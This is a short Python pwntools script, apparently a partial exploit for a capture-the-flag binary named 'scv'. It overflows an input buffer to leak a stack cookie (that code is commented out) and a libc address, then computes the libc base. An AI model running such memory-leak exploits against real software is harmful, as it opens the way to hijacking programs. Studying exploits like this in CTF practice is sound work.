from pwn import *
import sys

r = process("./scv")

# First, leak cookie

context.log_level = 'debug'

if "gdb" in sys.argv:
	gdb.attach(p, '''
	set disassembly-flavor intel
	set height 0
	c
	''')

def recvall():
    c = 0
    ret = ""
    while True:
        a = r.recvline(timeout=0.1)
        if a == "":
            c += 1
        ret += a
        if c == 5:
            break
    return ret

# r.sendline("1")
# r.sendline("E"*55)

# recvall()

# r.sendline("2")

# c = recvall()
# n = False
# stackleak = ""
# for a in c.split("\n"):
#     print a
#     if n:
#         print len(a)
#         for d in a:
#             stackleak = ("0"*(2-len(hex(ord(d))[2:])) + hex(ord(d))[2:]) + stackleak
#         print stackleak
#         n = False
#     if "EEEEEEEEEEEEEEEEEEEEEEEE" in a:
#         n = True

# stackleak = int(stackleak, 16)
# print ("Stack leak: " + hex(stackleak))


# Then, leak libc
r.sendline("1")
r.sendline("Q"*39)

recvall()

r.sendline("2")

c = recvall()
libc_leak = c.split("\n")
print "libc_leak", repr(libc_leak[6])
print "libc_leak", len(libc_leak[6])
libc_leak_addr =  u64(libc_leak[6] + "\x00\x00")
print libc_leak_addr
libc_base = libc_leak_addr - 220137
print "libc base", hex(libc_base)